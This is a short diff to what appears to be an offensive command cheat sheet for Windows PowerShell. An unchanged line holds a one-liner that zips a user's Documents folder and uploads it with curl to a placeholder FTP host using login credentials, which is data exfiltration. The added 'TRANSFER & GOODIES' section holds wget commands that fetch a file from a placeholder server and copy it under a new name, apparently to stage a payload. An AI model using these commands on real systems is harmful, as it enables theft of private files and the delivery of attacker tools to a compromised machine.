@@ -4,3 +4,6 @@ RECON:
 FILE MANAGMENT:
 "(Compress-Archive -Path .\Documents\ -CompressionLevel Optimal -DestinationPath Documents.zip); (curl.exe -T .\Documents.zip ftp://FTP-IP/Documents.zip --user user:password)"
 
+TRANSFER & GOODIES:
+'wget https://SOME-SERVER/picture.png -OutFile picture.png'
+'wget https://SOME-SERVER/picture.png -OutFile picture.png; copy picture.png picture.buzz'
